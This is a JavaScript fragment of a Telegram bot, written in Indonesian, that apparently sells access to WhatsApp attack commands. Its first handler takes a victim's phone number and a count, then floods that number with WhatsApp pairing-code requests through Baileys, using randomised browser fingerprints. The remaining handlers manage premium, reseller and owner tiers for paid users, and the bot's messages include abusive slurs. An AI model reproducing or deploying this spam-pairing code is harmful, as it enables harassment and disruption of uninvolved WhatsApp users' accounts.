  if (!match[1]) return bot.sendMessage(chatId, "*🚫 Masukin Nomor Yang Bener*\n_Contoh Nih : /Spaceman-SpamPairing 628xxxxxx 5000._", { parse_mode: "Markdown" });
  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  const count = parseInt(match[2]) || 30;
  if (!/^\d+$/.test(numberTarget)) return bot.sendMessage(chatId, "*🚫 Gagal Bro, Coba Ulang*\n_Contoh : /Spaceman-SpamPairing 628xxxxxx 5000._", { parse_mode: "Markdown" });
  const formatedNumber = numberTarget;


  // Kirim foto dengan caption markdown
  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption: `\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧👾
– Target  : ${numberTarget}
– Comand   : Spaceman-SpamPairing
– Status   : ✓ Success Mengirim Spam!
\`\`\``,
    parse_mode: "Markdown"
  });
    // Langsung spam
  try {
        const { state } = await useMultiFileAuthState('SpacemanSys');
        const { version } = await fetchLatestBaileysVersion();
        const ozzyNetral = ["Chrome", "Safari", "Firefox", "Edge", "Opera"];
        const randomBrowser = ozzyNetral[Math.floor(Math.random() * ozzyNetral.length)];
        const sucked = await makeWASocket({
            printQRInTerminal: false,
            mobile: false,
            auth: state,
            version,
            logger: P({ level: 'fatal' }),
            browser: ['Mac Os', randomBrowser, '121.0.6167.159']
        });

        for (let i = 0; i < count; i++) {
            await sleep(1000);
            try {
                await sucked.requestPairingCode(formatedNumber);
            } catch (e) {
                console.error(`Gagal spam pairing ke ${formatedNumber}:`, e);
                bot.sendMessage(chatId, `Gagal spam pairing ke ${formatedNumber} ( ${e} )`);
            }
        }
} catch (err) {
bot.sendMessage(chatId, `Gagal spam pairing ke ${formatedNumber}\nError : ${err}`);
}
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  // Check if the command is used in the allowed group

  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "🚫 Lu Bukan Admin Atau Owner Kontol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🚫 Mana ID Nya\nContoh Nih : /delprem 123456789.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Dihapus ${userId} Dari Premium`)
      bot.sendMessage(chatId, `✅ ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `🚫 ${userId} Bukan Lagi Premium.`);
  }
});
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  // Check if the command is used in the allowed group

  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "🚫 Lu Bukan Owner Atau Admin Kontol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🚫 Mana ID Nya\nContoh Nih : /addprem 123456789.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🚫 Mana ID Nya\nContoh Nih : /addprem 123456789.");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`)
      bot.sendMessage(chatId, `${userId} Berhasil Mendapatkan Access Premium.`);
  } else {
      bot.sendMessage(chatId, `${userId} Sudah Menjadi Premium.`);
  }
});


bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
// Check if the command is used in the allowed group

  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "🚫 Lu Ga Punya Access Tolol!!!");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "🚫 Mana ID Nya\nContoh Nih: /addowner 123456789.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "🚫 Mana ID Nya\nContoh Nih: /addowner 123456789.");
  }

  if (!OwnerUsers.includes(userId)) {
    OwnerUsers.push(userId);
    saveOwnerUsers(); // Simpan perubahan ke superVip
    console.log(`${senderId} Added ${userId} To Owner`);
    bot.sendMessage(chatId, `✅ ${userId} Berhasil Mendapatkan Access Owner.`);
  } else {
    bot.sendMessage(chatId, `😈 ${userId} Sudah Menjadi Owner.`);
  }
});
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
// Check if the command is used in the allowed group

  // Cek apakah user yang mengakses punya hak akses
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "🚫 Lu Gak Punya Access Tolol!!!");
  }

  // Cek input yang diberikan user
  if (!match[1]) {
    return bot.sendMessage(chatId, "🚫 Mana ID Nya\nContoh Nih: /delowner 123456789.");
  }

  // Ambil ID user dari input dan validasi
  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "🚫 Masukkan ID yang valid.");
  }

  // Cek apakah user yang dimaksud adalah superVip (owner)
  if (OwnerUsers.includes(userId)) {
    // Hapus dari superVip dan simpan perubahan
    OwnerUsers = superVip.filter(id => id !== userId);
    saveOwnerUsers(); // Simpan data terbaru
    console.log(`${senderId} Menghapus ${userId} Dari Owner`);
    bot.sendMessage(chatId, `✅ ${userId} Sudah Dihapus Dari Owner.`);
  } else {
    bot.sendMessage(chatId, `🚫 ${userId} Bukan Owner.`);
  }
});
bot.onText(/^\/setjeda(?:\s+(.+))?$/, (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "🚫 Kamu bukan owner, tidak boleh mengubah jeda.", { parse_mode: "Markdown" });
  }

  const input = (match[1] || "").trim();
  if (!input) {
    return bot.sendMessage(chatId, "🚫 Format kosong. Contoh: /setjeda 5m", { parse_mode: "Markdown" });
  }

  const seconds = parseDuration(input);
  if (seconds === null) {
    return bot.sendMessage(chatId, "🚫 Format salah! Contoh yang benar: /setjeda 30s, 5m, 2h, atau 1d", { parse_mode: "Markdown" });
  }

  defaultCooldowns = seconds;
  bot.sendMessage(chatId, `✅ Cooldown diubah menjadi *${seconds}* detik.`, { parse_mode: "Markdown" });
});


startWhatsapp(); // contoh: mulai koneksi WhatsApp